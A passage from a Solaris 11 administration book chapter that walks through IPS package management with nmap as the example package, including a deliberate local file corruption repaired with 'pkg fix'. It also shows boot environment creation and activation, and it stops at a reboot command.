<html><head></head><body>
<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01" class="calibre1"/>Chapter 1. IPS and Boot Environments</h1></div></div></div><p class="calibre7">In this chapter, we will cover the following topics:</p><div><ul class="itemizedlist"><li class="listitem">Determining the current package publisher</li><li class="listitem">Listing and collecting the information and dependencies of a package</li><li class="listitem">Installing a package, verifying its content, and fixing the package corruption</li><li class="listitem">Managing the IPS history and freezing and uninstalling packages</li><li class="listitem">Discovering the IPS Package Manager interface</li><li class="listitem">Creating, activating, and destroying a boot environment</li><li class="listitem">Listing and renaming a boot environment</li><li class="listitem">Configuring an IPS local repository</li><li class="listitem">Configuring a secondary IPS local repository</li><li class="listitem">Publishing packages into a repository</li><li class="listitem">Adding big applications into a repository</li><li class="listitem">Creating your own package and publishing it</li><li class="listitem">Managing an IPS publisher on Solaris 11</li><li class="listitem">Pinning publishers</li><li class="listitem">Changing the URI and enabling and disabling a publisher</li><li class="listitem">Creating a mirror repository</li><li class="listitem">Removing a repository and changing the search order</li><li class="listitem">Listing and creating a boot environment</li><li class="listitem">Mounting, unmounting, installing, and uninstalling a package in an inactive boot environment</li><li class="listitem">Activating a boot environment</li><li class="listitem">Creating a boot environment from an existing one</li></ul></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_1"><a id="ch01lvl1sec08" class="calibre1"/>Introduction</h1></div></div></div><p class="calibre7">As you already know, Oracle Solaris 11 has undergone many changes and now provides a framework to manage packages<a id="id0" class="calibre1"/> named <strong class="calibre8">Image Packaging System</strong> (<strong class="calibre8">IPS</strong>). This new framework makes an administrator's life easier when he or she needs to add, remove, collect, and administer any software packages. By default, Oracle offers a repository (a large group of packages) on the Web at <a class="calibre1" href="http://pkg.oracle.com/solaris/release/">http://pkg.oracle.com/solaris/release/</a>, and this is the<a id="id1" class="calibre1"/> default Oracle Solaris 11 repository. Using this repository, we will be able to install any package from the Internet, and as we are going to learn soon, it's feasible to create a local repository (like the default one) on our own Oracle Solaris 11 installation to improve<a id="id2" class="calibre1"/> the security and performance of our environment. Moreover, we can configure Oracle Solaris 11 to hold more than one repository as the source of the packages.</p><p class="calibre7">Going beyond IPS, Oracle Solaris 11 uses <strong class="calibre8">boot environments</strong> (<strong class="calibre8">BEs</strong>) to assist us in making an Oracle Solaris 11 upgrade without any risk to current data, because the<a id="id3" class="calibre1"/> update process creates a new BE before proceeding to the package update process. This new BE will be shown in the next reboot on the GRUB menu, and from there, we will be able to choose either the new BE (updated Solaris) or the old one. BEs will come in handy in other areas when handling the Oracle Solaris 11 administration.</p></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec09" class="calibre1"/>Determining the current package publisher</h1></div></div></div><p class="calibre7">When administering IPS on a Solaris 11 system, the first thing we need to do is find out the current <a id="id4" class="calibre1"/>package publisher because initially, it will be the source that our system will install or update a package from.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec07" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary<a id="id5" class="calibre1"/> that we have a machine (physical or virtual) running Oracle Solaris 11; we need to log in to this system as the root user and open a terminal.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec08" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">To list the existing publishers, we execute the following:</p><div><pre class="programlisting">root@solaris11:/# <strong class="calibre8">pkg publisher</strong>
PUBLISHER   TYPE    STATUS  P  LOCATION
solaris     origin  online  F  http://pkg.oracle.com/solaris/release/</pre></div><p class="calibre7">According to the output, the Oracle package URI and repository (<a class="calibre1" href="http://pkg.oracle.com/solaris/release/">http://pkg.oracle.com/solaris/release/</a>) is the source of the packages and updates (named as <code class="email">origin</code>), and it isn't proxied (when <code class="email">P</code> equals <code class="email">F</code>, the proxy is set to false).</p><p class="calibre7">To collect additional<a id="id6" class="calibre1"/> information about the publisher of the packages, we type the following:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg publisher solaris</strong>
Publisher: solaris
Alias:
Origin URI: http://pkg.oracle.com/solaris/release/
SSL Key: None
SSL Cert: None
Client UUID: f7cdfbf2-0292-11e2-831b-80144f013e20
Catalog Updated: September 12, 2013 04:22:26 PM
Enabled: Yes</pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec01" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">Using the<a id="id7" class="calibre1"/> main command, <code class="email">pkg</code>, with the <code class="email">publisher</code> keyword, we've found a list of publishers and that the <code class="email">solaris</code> publisher is <code class="email">online</code>, and a URI is enabled that points to the repository location, which is <a class="calibre1" href="http://pkg.oracle.com/solaris/release/">http://pkg.oracle.com/solaris/release/</a>. Furthermore, there is no SSL digital certificate associated with the <code class="email">solaris</code> publisher.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec10" class="calibre1"/>Listing and collecting the information and dependencies of a package</h1></div></div></div><p class="calibre7">To demonstrate how simple it is to administer packages, let's explore a useful example where we install a <a id="id8" class="calibre1"/>package on Oracle Solaris 11.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec09" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">First, we<a id="id9" class="calibre1"/> need to know which<a id="id10" class="calibre1"/> package we want to install. However, before installing any package, we need to confirm whether this package<a id="id11" class="calibre1"/> is already installed on<a id="id12" class="calibre1"/> the system by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg list nmap</strong>
pkg list: no packages matching 'nmap' installed</pre></div><p class="calibre7">As we can see, the <code class="email">nmap</code> package (scanning tool) isn't installed on Oracle Solaris 11; we can verify that this tool is available from the official source repository (<code class="email">solaris</code>, according to the previous publisher list). Furthermore, before accomplishing this step, it's suggested that we rebuild repository indexes (mainly if you don't remember when a package was inserted or removed the last time) to speed up the lookup process later:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg rebuild-index</strong>
PHASE                                       ITEMS
Building new search index                   847/847</pre></div><p class="calibre7">It's time to search for the <code class="email">nmap</code> package. We do this with the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg search nmap</strong>
INDEX           ACTION  VALUE                                   
                                                    PACKAGE
pkg.description set    Nmap is useful for inventorying the network, managing service upgrade schedules, and monitoring host or service uptime. pkg:/diagnostic/nmap@5.51-0.175.1.0.0.24.0
basename        file    usr/bin/nmap                            
                                                    pkg:/diagnostic/nmap@5.51-0.175.1.0.0.24.0
pkg.fmri        set     solaris/diagnostic/nmap                 
                                                    pkg:/diagnostic/nmap@5.51-0.175.1.0.0.24.0
basename        dir     usr/share/nmap                          
                                                    pkg:/diagnostic/nmap@5.51-0.175.1.0.0.24.0</pre></div><p class="calibre7">We can confirm<a id="id13" class="calibre1"/> that <code class="email">nmap</code> is available and isn't installed on<a id="id14" class="calibre1"/> the system, but a bit more information about the <a id="id15" class="calibre1"/>package won't hurt us. An easy way to know whether the <code class="email">nmap</code> package is installed or not is by executing the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">pkg list -af nmap</strong>
NAME (PUBLISHER)              VERSION                    IFO
diagnostic/nmap               5.51-0.175.1.0.0.24.0      ---</pre></div><a id="id16" class="calibre1"/><p class="calibre7">If the last column (<code class="email">IFO</code>) doesn't have an <code class="email">i</code> flag, then we can verify that the package<a id="id17" class="calibre1"/> isn't installed. We can also obtain complementary information about <code class="email">nmap</code> by typing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg info -r nmap</strong>
Name: diagnostic/nmap
Summary: Network exploration tool and security / port scanner.
Description: Nmap is useful for inventorying the network, managing service upgrade schedules, and monitoring host or service uptime.
Category: System/Administration and Configuration
 State: Not installed
 Publisher: solaris
 Version: 5.51
 Build Release: 5.11
Branch: 0.175.1.0.0.24.0
Packaging Date: September  4, 2012 05:17:49 PM 
Size: 12.28 MB
FMRI: pkg://solaris/diagnostic/nmap@5.51,5.11-0.175.1.0.0.24.0:20120904T171749Z</pre></div><p class="calibre7">This last <a id="id18" class="calibre1"/>command is important because we've collected valuable attributes about the <code class="email">nmap</code> package, such<a id="id19" class="calibre1"/> as its state (<code class="email">Not installed</code>) and size (<code class="email">12.28 MB</code>). The <code class="email">-r</code> option is necessary because it references a package<a id="id20" class="calibre1"/> in the repository<a id="id21" class="calibre1"/> from registered publishers. We can<a id="id22" class="calibre1"/> show Nmap's license agreement in the same way:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg info -r --license nmap</strong>
Oracle elects to use only the GNU Lesser General Public License version
2.1 (LGPL)/GNU General Public License version 2 (GPL) for any software
where a choice of LGPL/GPL license versions are made available with the
language indicating that LGPLv2.1/GPLv2 or any later version may be
used, or where a choice of which version of the LGPL/GPL is applied is
unspecified. 
…..........</pre></div><p class="calibre7">Sometimes, it's advisable to know which packages are required to install a specific package (such as <code class="email">nmap</code>) before you are able to try it. We can verify this by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg contents -r -o fmri,type -t depend nmap</strong>
FMRI                                                       TYPE
pkg:/library/pcre@8.21-0.175.1.0.0.23.0                             require
pkg:/library/python-2/pygobject-26@2.21.1-0.175.1.0.0.11.0   require
pkg:/library/python-2/pygtk2-26@2.17.0-0.175.1.0.0.19.0     require
pkg:/library/security/openssl@1.0.0.10-0.175.1.0.0.23.0      require
pkg:/runtime/lua@5.1.4-0.175.1.0.0.23.0                             require
pkg:/runtime/python-26@2.6.8-0.175.1.0.0.23.0                     require
pkg:/system/library/gcc-3-runtime@3.4.3-0.175.1.0.0.23.0         require
pkg:/system/library/libpcap@1.1.1-0.175.1.0.0.23.0                  require
pkg:/system/library/math@0.5.11-0.175.1.0.0.19.0                   require
pkg:/system/library@0.5.11-0.175.1.0.0.23.0                         require</pre></div><p class="calibre7">We can also reach the same result by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg contents -r -o action.raw -t depend nmap</strong>
ACTION.RAW
depend fmri=pkg:/library/python-2/pygobject-26@2.21.1-0.175.1.0.0.11.0 type=require
depend fmri=pkg:/system/library/gcc-3-runtime@3.4.3-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/library/security/openssl@1.0.0.10-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/runtime/lua@5.1.4-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/system/library/math@0.5.11-0.175.1.0.0.19.0 type=require
depend fmri=pkg:/system/library@0.5.11-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/runtime/python-26@2.6.8-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/library/pcre@8.21-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/system/library/libpcap@1.1.1-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/library/python-2/pygtk2-26@2.17.0-0.175.1.0.0.19.0 type=require</pre></div><p class="calibre7">The <code class="email">–t</code> option specifies <code class="email">action.raw</code>, which<a id="id23" class="calibre1"/> is used to limit the <a id="id24" class="calibre1"/>search to a specific attribute, such as <code class="email">depend</code>. The <code class="email">–r</code> option matches packages based on the newest available version and gets<a id="id25" class="calibre1"/> information<a id="id26" class="calibre1"/> about noninstalled packages, and the <code class="email">-o</code> option limits the columns to be shown in the output.</p><p class="calibre7">We have a list of <a id="id27" class="calibre1"/>required packages to install a new package such as <code class="email">nmap</code>, and all the packages are shown as <code class="email">require</code>; however, this command would have shown as <code class="email">optional</code> if we were managing another package.</p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec02" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">The previous commands have verified that if a specific package is already installed (<code class="email">nmap</code>), it reindexes the package catalog (to speed up the search) and collects details about the package. Furthermore, we've listed the decencies of the <code class="email">nmap</code> package. We will notice that the number of packages that were indexed (847) is very high, and that's the main reason this <a id="id28" class="calibre1"/>operation takes some time.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec11" class="calibre1"/>Installing a package, verifying its content, and fixing the package corruption</h1></div></div></div><p class="calibre7">This time, we have<a id="id29" class="calibre1"/> sufficient conditions to install a package and verify its contents, and if we find a problem with any package, we are able to fix it. This is<a id="id30" class="calibre1"/> an exciting section because it will introduce <a id="id31" class="calibre1"/>us to many useful commands, and all of them are used in day-to-day Solaris 11 administration.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec10" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">We'll learn the next procedure using the <code class="email">nmap</code> package, but the same can be done using any other Solaris 11 package.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec11" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">We execute the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg install -v nmap</strong>
           Packages to install:        1
         Estimated space available: 71.04 GB
     Estimated space to be consumed: 51.67 MB
       Create boot environment:       No
     Create backup boot environment:       No
           Services to change:        1
           Rebuild boot archive:       No

   Changed packages:
   solaris
   diagnostic/nmap
   None -&gt; 5.51,5.11-0.175.1.0.0.24.0:20120904T171749Z
   Services:
   restart_fmri:
   svc:/application/desktop-cache/desktop-mime-cache:default
   DOWNLOAD                                PKGS         FILES    XFER (MB)   SPEED
   Completed                                1/1       523/523      3.3/3.3 24.1k/s

PHASE                                             ITEMS
Installing new actions                            581/581
Updating package state database         Done 
Updating image state                            Done 
Creating fast lookup database               Done </pre></div><p class="calibre7">According to the output, Solaris 11 didn't create a BE. Sure, it was a very simple package installation. However, if we <a id="id32" class="calibre1"/>had installed a Solaris patch, the scenario would have<a id="id33" class="calibre1"/> been very different. We can check our<a id="id34" class="calibre1"/> installation by typing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg list nmap</strong>
NAME (PUBLISHER)                       VERSION                    IFO
diagnostic/nmap                        5.51-0.175.1.0.0.24.0      i--</pre></div><p class="calibre7">The last column shows us that the package has been installed, so to show the content of our installation, we type the following:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg contents nmap</strong>
PATH
usr
usr/bin
usr/bin/ncat
usr/bin/ndiff
usr/bin/nmap
usr/bin/nmapfe
usr/bin/nping
usr/bin/xnmap
usr/bin/zenmap
usr/lib
usr/lib/python2.6
usr/lib/python2.6/vendor-packages
usr/lib/python2.6/vendor-packages/radialnet
usr/lib/python2.6/vendor-packages/radialnet/__init__.py
usr/lib/python2.6/vendor-packages/radialnet/__init__.pyc
…......................</pre></div><p class="calibre7">We can use an alternative form, with presentation of additional information, by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg contents -t file -o owner,mode,pkg.size,path nmap</strong>
OWNER   MODE   PKG.SIZE    PATH
root    0555   166228      usr/bin/ncat
root    0555   48418       usr/bin/ndiff
root    0555   1540872     usr/bin/nmap
root    0555   608972      usr/bin/nping
root    0555   6748        usr/bin/zenmap
…...................</pre></div><p class="calibre7">Additionally, every package has an associated file named <code class="email">manifest</code>, which describes details such as the package content, its attributes, and dependencies. We can view this <code class="email">manifest</code> file of an<a id="id35" class="calibre1"/> installed package<a id="id36" class="calibre1"/> using the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg contents -m nmap | more</strong>
set name=pkg.fmri value=pkg://solaris/diagnostic/nmap@5.51,5.11-0.175.1.0.0.24.0:20120904T171749Z
set name=pkg.debug.depend.bypassed value=usr/lib/python2.6/vendor-packages/zenmapGUI/SearchWindow.py:.*
set name=variant.arch value=i386 value=sparc
set name=org.opensolaris.consolidation value=userland
set name=org.opensolaris.arc-caseid value=PSARC/2007/129
set name=info.upstream-url value=http://insecure.org/
set name=info.source-url value=http://nmap.org/dist/nmap-5.51.tgz
set name=pkg.summary value="Network exploration tool and security / port scanner."
set name=info.classification value="org.opensolaris.category.2008:System/Administration and Configuration"
  …................................................
  …...............................................</pre></div><div><h3 class="title2"><a id="tip02" class="calibre1"/>Tip</h3><p class="calibre7">You might wonder whether it is possible to check whether a package installation has kept its integrity. Yes, you can manage this issue using the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg verify -v nmap</strong>
PACKAGE                                           STATUS
pkg://solaris/diagnostic/nmap                     OK</pre></div></div><p class="calibre7">Let's create a simple test<a id="id37" class="calibre1"/> where we break any file from the <code class="email">nmap</code> package; afterwards, we check the package status by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">find / -name nmap</strong>
/usr/bin/nmap</pre></div><p class="calibre7">We continue further by executing the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">mkdir /backup</strong>
root@solaris11:~# <strong class="calibre8">cp /usr/bin/nmap /backup/</strong>
root@solaris11:~# <strong class="calibre8">echo GARBAGE  &gt; /usr/bin/nmap</strong>
root@solaris11:~# <strong class="calibre8">pkg verify -v nmap</strong>
PACKAGE                                                      STATUS
pkg://solaris/diagnostic/nmap                                ERROR
 file: usr/bin/nmap
  Unexpected Exception: Request error: class file/memory     mismatch</pre></div><p class="calibre7">Wow! The command used to detect the <code class="email">nmap</code> package corruption detected the exact problem. We can fix this<a id="id38" class="calibre1"/> potential problem in a very simple and <a id="id39" class="calibre1"/>quick way:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg fix nmap</strong>
Verifying: pkg://solaris/diagnostic/nmap                        ERROR
  file: usr/bin/nmap
Unexpected Exception: Request error: class file/memory mismatch
Created ZFS snapshot: 2013-10-10-22:27:20
Repairing: pkg://solaris/diagnostic/nmap                     
Creating Plan (Evaluating mediators): \

DOWNLOAD                                PKGS         FILES    XFER (MB)   SPEED
Completed                                1/1           1/1      0.5/0.5 97.0k/s

PHASE                                            ITEMS
Updating modified actions                        1/1
Updating image state                             Done 
Creating fast lookup database                    Done </pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec03" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">During the <code class="email">nmap</code> package installation, we realized that it takes 51.67 MB after it is installed and that it hasn't created a new BE. In the<a id="id40" class="calibre1"/> remaining commands, we found out a lot of information; for example, the files are contained in the <code class="email">nmap</code> package, this package runs on x86 or SPARC, it comes from the Solaris repository and has been developed by <a class="calibre1" href="http://insecure.org">http://insecure.org</a>, its source file is <code class="email">nmap-5.51.tgz</code>, and it only runs on userland. Afterwards, we verified the <code class="email">nmap</code> integrity, corrupted it, and fixed it.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec12" class="calibre1"/>Managing the IPS history and freezing and uninstalling packages</h1></div></div></div><p class="calibre7">Auditing is another <a id="id41" class="calibre1"/>current concern for<a id="id42" class="calibre1"/> companies, and<a id="id43" class="calibre1"/> most times, it's very helpful to know which package<a id="id44" class="calibre1"/> operations have happened recently. Furthermore, we're going to learn a way to drop the IPS command history.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec12" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">To gather this information, we execute the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg history</strong>
START                    OPERATION               CLIENT              OUTCOME
2012-09-19T16:48:22      set-property             transfer module    Succeeded
2012-09-19T16:48:22      add-publisher           transfer module    Succeeded
2012-09-19T16:48:22      refresh-publishers    transfer module    Succeeded
2012-09-19T16:48:22      image-create            transfer module    Succeeded
2012-09-19T16:48:30      rebuild-image-catalogs   transfer module    Succeeded
2012-09-19T16:48:36      set-property             transfer module    Succeeded
2012-09-19T16:48:37      install                     transfer module    Succeeded
2012-09-19T17:30:12      update-publisher      transfer module    Succeeded
2012-09-19T17:30:12      refresh-publishers    transfer module    Succeeded
2012-09-19T17:30:16      rebuild-image-catalogs   transfer module    Succeeded
2013-10-05T20:58:30      uninstall                transfer module    Succeeded
2013-10-05T21:42:06      refresh-publishers       pkg                 Succeeded
2013-10-05T21:42:06      install                    pkg                Failed
2013-10-05T21:42:14      rebuild-image-catalogs   pkg           Succeeded
2013-10-07T17:40:53      install                  pkg                Succeeded
2013-10-07T18:31:03      uninstall                     pkg                Succeeded
2013-10-07T19:06:14      install                   pkg                Succeeded</pre></div><p class="calibre7">We don't always<a id="id45" class="calibre1"/> need or want to keep the history of our actions; Oracle Solaris 11 allows us to erase the history by running a simple command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg purge-history</strong>
History purged.</pre></div><p class="calibre7">From time to time, Oracle Solaris 11 packages undergo updates, and we know it's advisable to update packages when there's a new version available. Updates can be checked using the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg update nmap</strong>
No updates available for this image</pre></div><p class="calibre7">Nonetheless, it needs to be highlighted that if we execute <code class="email">pkg update</code>, the entire system will be updated.</p><p class="calibre7">In a rare situation, we might<a id="id46" class="calibre1"/> be required to freeze a package to prevent an update. This intervention, although very unlikely, is suitable when we have to keep a very<a id="id47" class="calibre1"/> specific software version in the system even when it is executing an update command, such as <code class="email">pkg update</code>, to modify this content. The following command is<a id="id48" class="calibre1"/> used for freezing:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg freeze diagnostic/nmap</strong>
diagnostic/nmap was frozen at 5.51-0.175.1.0.0.24.0:20120904T171749Z</pre></div><p class="calibre7">In the same way, we can change our mind and unfreeze the <code class="email">nmap</code> package by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg unfreeze diagnostic/nmap</strong>
diagnostic/nmap was unfrozen.</pre></div><p class="calibre7">Before we continue, we can use a nice trick to update Nmap again without using the <code class="email">pkg update nmap</code> command. A facet represents an optional software component, such as the <code class="email">locale</code> property, while variants represent a mutually exclusive software component (an x86 component against a SPARC component).</p><p class="calibre7">A package has an associated action and a facet is defined as a tag of the package's action. So, when the <code class="email">version.lock</code> facet is set to the <code class="email">true</code> value (no matter the value that was set previously), the IPS framework checks whether a new version of the package is present on the repository:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg change-facet facet.version-lock.diagnostic/nmap=true</strong>
            Packages to update: 849
      Variants/Facets to change:   1
        Create boot environment:  No
Create backup boot environment: Yes

PHASE                                          ITEMS
Updating image state                           Done 
Creating fast lookup database                  Done </pre></div><div><h3 class="title2"><a id="note02" class="calibre1"/>Note</h3><p class="calibre7">If you want to learn more about variants and facets, refer to <em class="calibre11">Controlling Installation of Optional Components</em> from the <em class="calibre11">Adding and Updating Oracle Solaris 11.1 Software Packages</em> manual at <a class="calibre1" href="http://docs.oracle.com/cd/E26502_01/html/E28984/glmke.html#scrolltoc">http://docs.oracle.com/cd/E26502_01/html/E28984/glmke.html#scrolltoc</a>.</p></div><p class="calibre7">Finally, to finish our review of the IPS administration, an essential factor when administering <a id="id49" class="calibre1"/>packages<a id="id50" class="calibre1"/> is to know how to uninstall them:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg uninstall nmap</strong>
            Packages to remove:  1
       Create boot environment: No
Create backup boot environment: No
            Services to change:  1

PHASE                                           ITEMS
Removing old actions                            598/598
Updating package state database                 Done 
Updating package cache                          1/1 
Updating image state                            Done 
Creating fast lookup database                   Done 

root@solaris11:~# <strong class="calibre8">pkg list nmap</strong>
pkg list: no packages matching 'nmap' installed</pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec04" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">It's possible to list all the actions performed by the administrator that have succeeded or failed on the IPS framework using the <a id="id51" class="calibre1"/>
<code class="email">pkg history</code> command, including the exact time when the <code class="email">pkg</code> command was executed. This sure is a nice feature if we want to initiate an audit. There's a command called<a id="id52" class="calibre1"/> <code class="email">pkg purge-history</code> that erases all history and must only be executed by the root user. We also learned about <code class="email">pkg freeze</code>, which prevents Oracle Solaris 11 from updating a particular package. Finally, we've seen how easy it is to uninstall a package using <code class="email">pkg uninstall</code>.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec13" class="calibre1"/>Discovering the IPS Package Manager interface</h1></div></div></div><p class="calibre7">Some administrators prefer using GUI to administer areas of Oracle Solaris 11. This might be your preference, as well, and for this, there's Package Manager GUI, which is a well-made interface that makes it possible to accomplish almost every package administration. Personally, I believe it's a <a id="id53" class="calibre1"/>very neat tool if you want to view all available packages from the repository; when I need to install many packages at once, it makes the job easier.</p><p class="calibre7">Although the Package Manager GUI has multiple handy features, we won't discuss any of these characteristics here. If you want to know more about the graphical interface, I'm sure you will be able to explore and learn it on your own.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec13" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">To launch the Package <a id="id54" class="calibre1"/>Manager interface, we go to <strong class="calibre8">System</strong> | <strong class="calibre8">Administrator</strong> | <strong class="calibre8">Package Manager</strong>:</p><div><img src="img/00003.jpeg" alt="How to do it…" class="calibre12"/></div><p class="calibre13"> </p><p class="calibre7">Nice! We've done a<a id="id55" class="calibre1"/> basic review of the IPS administration. Now, we will proceed with another basic review of BEs.</p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec05" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">The GUI is a wonderful way to <a id="id56" class="calibre1"/>manage IPS packages on an Oracle Solaris 11 system, and it's able to make the most of IPS administration tasks as well as BE administration tasks.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec14" class="calibre1"/>Creating, activating, and destroying a boot environment</h1></div></div></div><p class="calibre7">I always like to ask this question with respect to BEs: what are the facts that make life easier when administering Oracle Solaris 11?</p><p class="calibre7">Maybe the answers aren't so difficult; to prove this, let's imagine a scenario. We are requested to update Oracle Solaris 11, and to do<a id="id57" class="calibre1"/> this, we need to reboot the system, insert the Oracle Solaris 11 installation DVD, and during the boot, we have to choose the upgrade option. Is the upgrade complete? Is there no further problem? Unfortunately, this is not true because there are some <a id="id58" class="calibre1"/>potential tradeoffs:</p><div><ul class="itemizedlist"><li class="listitem">We had to stop applications and reboot the operating system, and users had to stop work on their tasks</li><li class="listitem">If there was<a id="id59" class="calibre1"/> trouble upgrading the Oracle Solaris operating system, we'll lose all old installation because the upgrade process will have overwritten the previous <a id="id60" class="calibre1"/>version of Oracle Solaris; consequently, we won't be able to reboot the system and go back to the previous version</li></ul></div><p class="calibre7">As you will have realized, this is a big threat to administrators because in the first case, we had a working (but outdated) system, and in the second case, we risked losing everything (and our valuable job) if anything went wrong. How can we improve this situation?</p><p class="calibre7">In Oracle Solaris 11, when we are requested to upgrade a system, Oracle Solaris 11 takes a BE automatically to help us during the process. The boot environment is a kind of clone that makes it possible to save the previous installation, and if anything goes wrong during the upgrade, the boot environment of Oracle Solaris 11 lets us roll back the OS to the old state (installation). One of the biggest advantages of this procedure is that the administrator isn't obliged to execute any command to create a BE to protect and save the previous installation. Oracle Solaris 11 manages the whole process. This has two advantages: the upgrade process gets finished without rebooting the operating system, and the boot environment enables us to roll back the environment if we encounter a problem.</p><p class="calibre7">You should know that BEs aren't only used for upgrade operations. Indeed, we can deploy them to patch the system, install an application, or create a test environment. In all of these cases, the BE makes it possible to revert the system to the previous state. So, after we have taken care of these fundamentals, it's time to practice.</p><p class="calibre7">Nowadays, professionals are making heavy use of the BE, and this is the true reason that creating, activating, and destroying BEs is most important when administering Oracle Solaris 11. You can be sure that this knowledge will be fundamental to your understanding of Oracle Solaris 11 Advanced Administration.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec14" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a machine (physical or virtual) running Oracle Solaris 11; we log<a id="id61" class="calibre1"/> in to the system <a id="id62" class="calibre1"/>as the root user and open a terminal. Additionally, our<a id="id63" class="calibre1"/> system must have access to the Internet. Some extra free space might be required.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec15" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">Without any delay, we execute the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm create solaris-backup-1</strong>
root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE                Active Mountpoint Space    Policy  Created  
-------------     ---------------------------------  ---------- 
solaris           NR     /          4.99G    static  2013-10-05 20:44
solaris-backup-1  -      -          163.0K   static  2013-10-10 19:57
solaris-backup-b  -      -          173.0K   static  2013-10-12 22:47</pre></div><p class="calibre7">Oracle Solaris 11 automatically creates an entry in the GRUB list and makes it the default choice. However, it is relevant to note that another BE named <code class="email">solaris-backup-b</code> is already present on the system from previous tests and it will be used in some steps ahead.</p><p class="calibre7">To enable the <code class="email">solaris-backup-1</code> BE, execute the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm activate solaris-backup-1</strong>
root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE                   Active Mountpoint Space    Policy     Created          
-----------------------          ------------------------------------   ----------              ------------------------     
solaris              N       /          4.99G      static     2013-10-05 20:44
solaris-backup-1   R         -          163.0K     static     2013-10-10 19:57 
solaris-backup-b    -           -          173.0K     static     2013-10-12 22:47</pre></div><p class="calibre7">Note the <code class="email">Active</code> column from the last command. The flag for <code class="email">solaris-backup-1</code> has changed to <code class="email">R</code>, which means that it will be the active boot environment in the next boot. Therefore, it's time to reboot the system and list all the BEs:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">init 6</strong>
